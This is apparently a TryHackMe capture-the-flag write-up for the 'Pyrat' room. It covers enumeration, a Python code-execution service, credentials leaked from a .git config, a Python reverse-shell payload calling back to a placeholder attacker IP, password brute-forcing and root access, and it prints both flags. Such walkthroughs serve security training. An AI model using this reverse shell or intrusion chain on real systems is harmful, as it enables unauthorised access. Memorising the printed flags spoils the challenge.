🏴 Pyrat — TryHackMe Write-Up
📌 General Notes

Always use Incognito Mode when accessing TryHackMe machines

Browser cache may cause unexpected behavior

Maintain proper /etc/hosts entries if required

Focus on understanding tool logic and service behavior

Keep reports structured and readable

🔍 Enumeration
🔎 Nmap Scan

Command used:

nmap -sC -sV -oN scan.txt <target-ip>


Key findings:

22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu
8000/tcp open  http     SimpleHTTP/0.6 Python/3.11.2

🧠 Analysis

SSH (22) → Standard OpenSSH service, requires valid credentials

Port 8000 → Python-based HTTP service behaving abnormally

HTTP methods such as GET, OPTIONS, and HELP returned Python errors

Strong indicator that user input is directly evaluated by Python

This made port 8000 the primary attack surface.

🌐 Service Enumeration (Port 8000)

Connected manually using Netcat:

nc <target-ip> 8000


The service accepted raw Python input, confirming Python code execution.

File System Testing
print(os.listdir("/root"))
# Permission denied

print(os.listdir("/opt/dev/.git/"))


The .git directory was readable and contained sensitive information.

🔑 Credential Discovery (Git Leak)

Inside Git configuration:

[credential "https://github.com"]
    username = think
    password = _TH1NKINGPirate$_


These credentials were later reused for SSH access.

🐚 Reverse Shell
Listener (Attacker Machine)
nc -lvnp 4000

Python Reverse Shell Payload
echo 'import socket,os,pty;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("ATTACKER-IP",4000));
os.dup2(s.fileno(),0);
os.dup2(s.fileno(),1);
os.dup2(s.fileno(),2);
pty.spawn("sh")' | nc <target-ip> 8000


A shell was successfully obtained.

👤 User Access (think)

Using leaked credentials:

ssh think@<target-ip>

User Flag
996bdb1f619a68361417cabca5454705

🔎 Privilege Escalation Enumeration
Running Processes
ps aux | grep root


Relevant output:

root  python3 /root/pyrat.py


A custom Python script was running as root, indicating a possible escalation vector.

🧠 Root Script Analysis (/root/pyrat.py)

Revealed a hidden admin authentication endpoint

Username differed from system users

Password-based authentication required

🔐 Password Brute Force (Custom Script)

Since the service was not HTTP-based, a custom Python brute-force script was created using raw TCP sockets.

Brute Force Script (Used)
python newscript.py <target-ip> 8000 wordlist.txt

Result
Username: admin
Password: abc123


Authentication succeeded, granting root-level shell access.

🏁 Root Flag
print(open('/root/root.txt', 'r').read())

ba5ed03e9e74bb98054438480165e221

🏆 Flags Summary
Type	Flag
User	996bdb1f619a68361417cabca5454705
Root	ba5ed03e9e74bb98054438480165e221
🧩 Key Takeaways

Python-based services may evaluate user input directly

Exposed .git directories can leak critical credentials

Custom brute-force scripts outperform automated tools on non-standard services

Root privilege escalation often hides in custom scripts

Enumeration depth matters more than speed

🛠 Tools Used

Nmap

Netcat

SSH

Python (custom scripts)

LinPEAS
